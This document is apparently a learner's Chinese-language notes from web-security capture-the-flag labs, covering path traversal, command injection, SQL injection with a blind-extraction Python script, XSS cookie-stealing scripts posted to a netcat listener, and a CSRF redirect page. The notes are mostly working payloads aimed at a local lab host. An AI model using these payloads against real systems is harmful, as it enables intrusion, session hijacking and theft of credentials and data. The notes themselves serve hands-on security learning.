curl http://challenge.localhost/content/../../../flag
    --当检查到代码出现 @app.route("/content", methods=["GET"])
    @app.route("/content/<path:path>", methods=["GET"])
    def challenge(path="index.html"):
    requested_path = app.root_path + "/files/" + path
    --则发现代码会将content后的路径处理为root，所以通过../../../ 返回到路径的根目录，然后通过flag获取flag
    --但是网站会检测../为非法字符，所以使用转义符号%2e%2e%2f代替
     curl http://challenge.localhost/content/%2e%2e%2f %2e%2e%2f %2e%2e%2f flag     
            --%2e%2e%2f==../


    curl http://challenge.localhost/data/fortunes/%2e%2e%2f%2e%2e%2f%2e%2e%2fflag 

    curl "http://challenge.localhost/goal?dir=/challenge;cat /flag"、
       --出现@app.route("/goal", methods=["GET"])
            def challenge():
                directory = flask.request.args.get("dir", "/challenge")
                command = f"ls -l {directory}"

    --此时存在一个/goal路径，可以使用curl访问，并且存在一个challenge()方法
         --包括一个命令会强制执行ls -l /challenge,
            --所以可以通过curl http://challenge.localhost/goal?dir=/challenge，去访问目录
            --并且在加上curl http://challenge.localhost/goal?dir=/challenge;whoami 后发现当前用户为root
            --所以可以通过curl http://challenge.localhost/goal?dir=/challenge;cat /flag 去获取flag
            --但是因为url会将空格视为违法或者是并不是空格，所以需要使用%20代替空格
    --当然一些挑战会尝试去除掉；,但是仍旧有|可以使用





CMDi3
    --command = f"ls -l '{directory}'"
    --此挑战会将输入的目录加上引号，如果不增加修改的话会获得
        -- curl "http://challenge.localhost/quest?subdirectory=/challenge|cat%20/flag"
            --这个会将/challenge|cat%20/flag作为一整个目录传递到ls -l中
    curl "http://challenge.localhost/quest?subdir/challenge|cat%20/flagectory=/challenge|cat%20/flag"
        --此时shell会收到''/challenge|cat /flag'' 
        --但是由于shell的错误理解，它认为前两个'' 是一对，后两个''是一对，所以会将/challenge|cat /flag则不被认为是一体的，而是两个命令
        --所以会先执行ls -l /challenge，然后执行cat /flag
CMDi4
    -- curl "http://challenge.localhost/dare?tz-tag=;cat%20/flag;date"

这两个挑战的核心都是因为使用了shell=True
    --在shell中特殊符号; | & 等会被解释为shell命令，所以会执行多个命令
    --所以在使用shell=True时，需要注意不要将用户输入的内容直接传递给shell，而是需要对用户输入进行过滤

CMDi5
    --curl "http://challenge/localhost/scenario?path=/challenge/PWN;cat%20/flag>%20/tmp/flag"

CMDi6
    --curl "http://challenge.localhost/quest?location=/challenge%0Acat%20/flag"
         在Shell的环境中换行符的作用是等同于分号的，所以会执行两个命令，即使不允许使用|和;也可以通过换行符来执行命令

SQLI3
    curl -v -X GET "http://challenge.localhost/?query=%22%20UNION%20SELECT%20password%20FROM%20users%20WHERE%20username='admin'%20--"
SQLI2
    阅读代码后发现使用了flask.request.args.get("userid") 和 flask.request.args.get("pword")来获取用户输入
    也就意味必须存在一个userid和pword的参数。
    并且在阅读发现query = f"SELECT * FROM users WHERE username='{userid}' AND password='{pword}'"
        --参数并没有被严格过滤，是直接传递给了sql语句
    --curl -c cookie.txt -X POST "http://challenge.localhost/gateway" -d "userid=admin'--&pword=111"
        --此时会将admin'-- 传递给sql语句，--会注释掉后面的内容，所以会查询到admin的信息
        --所使用的--'是为了注释掉后面的内容，防止sql语句报错

SQLI5
        import requests

        # 目标地址
        url = "http://challenge.localhost"

        # 包含空格和常见特殊符号的字符集合
        characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_: -.,@!$#%"

        flag = ""

        # SQL 注入自动化脚本
        for position in range(1, 100):  # 假设标志的长度最多为 100
            found = False
            for char in characters:
                # 构建盲注的 payload，逐字符检查
                payload = f"admin' OR SUBSTR((SELECT password FROM users WHERE username='admin'), {position}, 1) = '{char}' -- "

                # 使用 POST 请求发送 payload
                response = requests.post(url, data={"username": "admin", "password": payload})

                # 检查响应中是否有 "Hello, admin!"，标志猜测成功
                if "Hello, admin!" in response.text:
                    flag += char
                    print(f"Found character: {char} | Current flag: {flag}")
                    found = True
                    break  # 继续猜测下一位置

            # 如果没有找到匹配字符，说明已到达标志结束
            if not found:
                print("Password extraction complete.")
                break

        print(f"Final flag: {flag}")

SUBSTR(string, start_position, length)
    --string: 要提取的字符串
    --start_position: 要提取的字符串的起始位置
    --length: 要提取的字符串的长度

payload = f"admin' OR SUBSTR((SELECT password FROM users WHERE username='admin'), {position}, 1) = '{char}' -- "
    --admin' 此时的引号用于结束前
    



<script>
fetch('/draft')
.then(response => response.text())
.then(data => { console.log(data); window.location.href = '/publish'; }) //这个跳转是十分关键的，尤其是href可以让页面跳转到publish
.catch(error => console.error('Error:', error)); //这个也十分重要，如果不把错误打印出来，那么就会一直显示错误，而不是在控制台显示错误
</script>

fetch
    --fetch() 方法用于从网络获取资源（文本、图片等）
    --then(response => response.text())  
        --第一个response为一个参数，代表fetch()方法返回的结果，之后通过箭头转化为text文件
    --then(data => { console.log(data); window.location.href = '/publish'; })
        --第二个data为一个参数，代表上一个then()方法返回的结果，通过console.log()方法打印到控制台
        --window.location.href = '/publish'; 用于跳转到publish页面

此时增加的window.location.href
    --是因为原服务器代码在跳转到publish页面时，会自动提交所有的草稿，所以需要在跳转到publish页面时，将草稿提交。


-XSS 6
            <script>
            fetch('/draft')
                .then(response =>response.text())
                .then(data => {
                fetch('/publish',
                {method: 'POST',
                body: 'data=' + encodeURIComponent(data)})
                })
                .catch(error => console.error('Error:',error));
                </script>
            --此时的fetch('/publish')是一个POST请求，所以需要增加method: 'POST'，并且需要增加body: 'data=' + encodeURIComponent(data)来传递数据
            --encodeURIComponent() 函数可把字符串作为 URI 组件进行编码
            --此时的fetch('/draft')是一个GET请求，所以不需要增加method: 'GET'，也不需要增加body: 'data=' + encodeURIComponent(data)来传递数据
            --采用两个fetch()方法，第一个fetch()方法用于获取草稿，第二个fetch()方法用于提交草稿
            --POST 强制要求具有 body 属性，GET 不需要，并且需要声明method: 'POST'，GET不需要声明method: 'GET'

-XXS 7
        <script>
        var cookies = document.cookie;
        fetch('http://challenge.localhost:8080', {
            method: 'POST',
            headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: 'cookies=' + encodeURIComponent(cookies)
        });
        </script>
        --此时虽然确实可以监听到cookie，但是由于管理员程序并不会进入这个端口所有需要更改


        <script>
        var cookies = document.cookie;
        fetch('http://challenge.localhost:8080/login', {
            method: 'POST',
            headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: 'cookies=' + encodeURIComponent(cookies)
        });
        </script>
        --改为login端口，这样就可以监听到cookie了
        --通过观察victim发现会有
            --127.0.0.1 - - [02/Feb/2025 20:42:13] "GET /favicon.ico HTTP/1.1" 404 -
            127.0.0.1 - - [02/Feb/2025 20:42:13] "POST /login HTTP/1.1" 302 -
            127.0.0.1 - - [02/Feb/2025 20:42:13] "GET / HTTP/1.1" 200 -
        --有login的操作，所以可以通过这个来监听cookie
        并且启用 nc -lv localhost 8080 来监听cookie

        得到cookie后可以通过
        curl -b "auth=%3Dadmin%7C6F.dJDO1YDL5UTNxczW%7D" http://challenge.localhost/
            --得到了flag



<script>
fetch('/draft')
.then(response => response.text())
.then(data => { console.log(data); window.location.href = '/publish'; }) 
.catch(error => console.error('Error:', error)); 
</script>


csrf 1
    -
    <!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <meta http-equiv="refresh" content="0; url=http://challenge.localhost/publish">
    <title>CSRF Attack</title>
  </head>
  <body>
    <p>If you are not redirected automatically, please <a href="http://challenge.localhost/publish">click here</a>.</p>
  </body>
</html>

    --sensai给出的方法并不正确并不能让页面跳转到publich
    --这个方法的meta可以让信息不显示在页面
    --http-equiv="refresh" content="0; url=http://challenge.localhost/publish"
        --相互配合让页面刷新，并且0秒后跳转到指定的url